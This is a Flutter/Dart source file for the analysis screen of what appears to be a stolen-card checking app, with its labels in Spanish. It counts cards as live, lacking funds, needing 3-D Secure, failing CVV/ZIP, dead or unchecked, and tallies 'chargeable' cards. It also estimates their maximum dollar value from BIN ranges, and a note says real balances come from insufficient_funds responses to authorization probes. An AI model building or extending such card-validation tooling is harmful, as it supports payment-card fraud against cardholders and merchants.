import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../core.dart';
import '../models.dart';
import '../providers.dart';
import '../selftest.dart';
import '../theme.dart';
import '../value.dart';
import '../widgets.dart';

class AnalysisScreen extends ConsumerStatefulWidget {
  const AnalysisScreen({super.key});
  @override
  ConsumerState<AnalysisScreen> createState() => _AnalysisScreenState();
}

class _AnalysisScreenState extends ConsumerState<AnalysisScreen> {
  List<TestLine>? _tests;

  @override
  Widget build(BuildContext context) {
    final cards = ref.watch(cardsProvider);

    int count(CheckStatus s) => cards.where((c) => c.status == s).length;
    final cobrables = cards.where((c) => c.status.cobrable).length;
    var totalHi = 0;
    for (final c in cards.where((c) => c.status.cobrable)) {
      totalHi += estimateBalance(c).hi;
    }

    return ListView(
      padding: const EdgeInsets.all(14),
      children: [
        const Text('Analisis', style: AppTextStyles.title),
        const SectionHeader('Resumen'),
        GlassPanel(
          child: Column(
            children: [
              _stat('total', fmtInt(cards.length), AppColors.textHi),
              _stat('vivas', fmtInt(count(CheckStatus.live)), AppColors.lime),
              _stat('sin fondos', fmtInt(count(CheckStatus.noFunds)), AppColors.amber),
              _stat('pide 3ds', fmtInt(count(CheckStatus.need3ds)), AppColors.cyan),
              _stat(
                'cvv/zip malo',
                fmtInt(count(CheckStatus.cvcFail) + count(CheckStatus.avsFail)),
                AppColors.violet,
              ),
              _stat('muertas', fmtInt(count(CheckStatus.dead)), AppColors.red),
              _stat('sin comprobar', fmtInt(count(CheckStatus.unchecked)), AppColors.textMid),
              const Divider(color: AppColors.stroke),
              _stat('cobrables', fmtInt(cobrables), AppColors.lime),
              _stat('valor estimado (max)', '\$${fmtInt(totalHi)}', AppColors.cyan),
            ],
          ),
        ),
        const SectionHeader('Test interno'),
        NeonButton(
          label: 'Ejecutar test',
          icon: Icons.science,
          color: AppColors.cyan,
          expand: true,
          onPressed: () => setState(() => _tests = SelfTest.local()),
        ),
        if (_tests != null) ...[
          const SizedBox(height: 10),
          GlassPanel(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                for (final t in _tests!)
                  Padding(
                    padding: const EdgeInsets.symmetric(vertical: 2),
                    child: Row(
                      children: [
                        Icon(
                          t.ok ? Icons.check_circle : Icons.error,
                          size: 14,
                          color: t.ok ? AppColors.lime : AppColors.red,
                        ),
                        const SizedBox(width: 8),
                        Expanded(child: Text(t.name, style: AppTextStyles.caption)),
                        if (t.note.isNotEmpty) Text(t.note, style: AppTextStyles.tiny),
                      ],
                    ),
                  ),
              ],
            ),
          ),
        ],
        const SectionHeader('Nota honesta'),
        const GlassPanel(
          child: Text(
            'El valor estimado NO es el saldo real: es un rango por BIN. El unico dato duro de saldo lo da insufficient_funds en modo auth.',
            style: AppTextStyles.caption,
          ),
        ),
        const SizedBox(height: 30),
      ],
    );
  }

  Widget _stat(String k, String v, Color c) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 3),
        child: Row(
          children: [
            Expanded(child: Text(k, style: AppTextStyles.caption)),
            Text(v, style: TextStyle(color: c, fontWeight: FontWeight.w800)),
          ],
        ),
      );
}
